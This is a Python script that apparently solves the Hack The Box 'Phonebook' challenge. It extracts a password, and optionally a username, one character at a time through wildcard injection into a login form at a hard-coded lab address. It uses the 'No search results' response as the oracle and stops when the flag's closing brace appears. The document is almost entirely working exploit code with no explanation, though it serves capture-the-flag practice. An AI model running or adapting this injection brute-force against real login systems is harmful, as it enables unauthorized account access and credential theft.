# Hack The Box

## Phonebook

```python
import requests
import string

char = string.printable
char = char.replace("*" , "")
url = "http://138.68.175.87:31922/login"
session = requests.Session()



username = "reese"
#while(-1):
#	for i in char:		
#		data = {
#		"username" : f"{username}{i}*",
#		"password" : "*"
#		}
#		print(data)
#		r = session.post(url = url , data = data)
#		if "No search results" in r.text:		
#			username += i			
#			print(username)
#			break
password = ""
while(-1):
	for i in char:		
		data = {
		"username" : "reese",
		"password" : f"{password}{i}*"
		} 
		print(data)
		r = session.post(url = url , data = data)
		if "No search results" in r.text:		
			password += i			
			print(password)
			break
	if "}" in password:
		break
			
print(password)
		


```
